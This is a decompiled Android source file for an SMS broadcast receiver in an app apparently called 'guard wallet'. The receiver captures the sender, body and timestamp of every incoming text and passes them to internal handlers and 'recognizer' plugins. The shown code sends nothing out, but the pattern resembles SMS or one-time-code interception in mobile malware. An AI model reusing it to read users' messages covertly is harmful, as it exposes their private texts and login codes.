package com.guard.wallet.receiver;

import a1.AbstractC0026q;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.resp.SmsMessageVO;
import com.guard.wallet.resp.SmsRecognizePlug;
import java.util.Iterator;
import java.util.LinkedList;

/* loaded from: classes.dex */
public class SmsReceiver extends BroadcastReceiver {

    /* renamed from: a */
    public Integer f286a = 0;

    @Override // android.content.BroadcastReceiver
    public final void onReceive(Context context, Intent intent) {
        Object[] objArr;
        SmsMessage createFromPdu;
        try {
            this.f286a = 1;
            if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction()) || "android.provider.Telephony.SMS_DELIVER".equals(intent.getAction())) {
                Log.d("SmsReceiver", "开始接收短信.....");
                Bundle extras = intent.getExtras();
                String stringExtra = intent.getStringExtra("format");
                if (extras == null || extras.get("pdus") == null || (objArr = (Object[]) extras.get("pdus")) == null || objArr.length <= 0) {
                    return;
                }
                for (Object obj : objArr) {
                    try {
                        byte[] bArr = (byte[]) obj;
                        if (bArr != null && bArr.length > 0 && (createFromPdu = SmsMessage.createFromPdu(bArr, stringExtra)) != null) {
                            SmsMessageVO smsMessageVO = new SmsMessageVO(createFromPdu.getOriginatingAddress(), createFromPdu.getDisplayOriginatingAddress(), createFromPdu.getMessageBody(), stringExtra, String.valueOf(createFromPdu.getTimestampMillis()), 1);
                            String action = intent.getAction();
                            if (!AbstractC0026q.m151B(action)) {
                                MessageRecordVO messageRecordVO = new MessageRecordVO();
                                messageRecordVO.setExtraBody(smsMessageVO);
                                messageRecordVO.setIntentCode(action);
                                MainApplication.getInstance().getHandlerMsgAndTimer().m579b(messageRecordVO);
                            }
                            if (MainApplication.getInstance().getSmsMessageListener() != null) {
                                LinkedList linkedList = MainApplication.getInstance().getSmsMessageListener().f2086a;
                                if (!linkedList.isEmpty()) {
                                    Iterator it = linkedList.iterator();
                                    while (it.hasNext()) {
                                        ((SmsRecognizePlug) it.next()).offer(smsMessageVO);
                                    }
                                }
                            }
                        }
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("SmsReceiver", e2);
                    }
                }
            }
        } catch (Exception e3) {
            AbstractC0026q.m186s("SmsReceiver", e3);
        }
    }
}
